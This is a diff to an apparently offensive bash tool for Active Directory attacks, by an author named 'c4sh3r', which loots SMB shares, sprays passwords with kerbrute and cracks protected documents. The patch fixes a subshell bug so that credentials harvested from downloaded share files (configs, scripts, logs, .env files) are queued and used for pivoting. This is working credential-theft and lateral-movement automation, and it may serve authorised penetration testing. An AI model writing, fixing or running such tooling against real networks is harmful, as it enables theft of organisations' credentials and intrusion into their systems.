@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.20.0"
+readonly VERSION="1.20.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2514,13 +2514,19 @@ phase_share_loot() {
     # Skip: SYSVOL/GPO policy trees (GUIDs/registry hex), per-user AppData
     # profiles (browser/app junk → garbage tokens that flood the spray) and
     # desktop.ini stubs. Real share docs (IT/HR/Finance/etc.) are kept.
-    find "$dl" -type f -size -200k \
+    # IMPORTANT: feed harvest_secrets via process substitution, NOT a pipe. A pipe
+    # runs the RIGHT side in a SUBSHELL, so the queue_cred/add_secret it performs
+    # mutate a throwaway CRED_QUEUE/FOUND_SECRETS and are lost on subshell exit —
+    # that's exactly why a harvested credential (e.g. svc_recovery from a log)
+    # printed "queued" yet was never assessed/pivoted. `< <(...)` keeps
+    # harvest_secrets in THIS shell so the in-memory queue actually grows.
+    harvest_secrets "shares" < <(find "$dl" -type f -size -200k \
         -not -ipath '*/sysvol/*' -not -ipath '*/policies/*' -not -ipath '*/AppData/*' \
         -not -iname 'desktop.ini' \
         \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
         -o -iname '*.xml' -o -iname '*.ps1' -o -iname '*.bat' -o -iname '*.conf' -o -iname '*.cnf' \
         -o -iname '*.log' -o -iname '*.csv' -o -iname '*.json' -o -iname '*.yml' -o -iname '*.yaml' -o -iname '*.env' \) \
-        -exec cat {} + 2>/dev/null | harvest_secrets "shares"
+        -exec cat {} + 2>/dev/null)
 
     subsection "Cracking password-protected documents found on shares"
     while IFS= read -r f; do
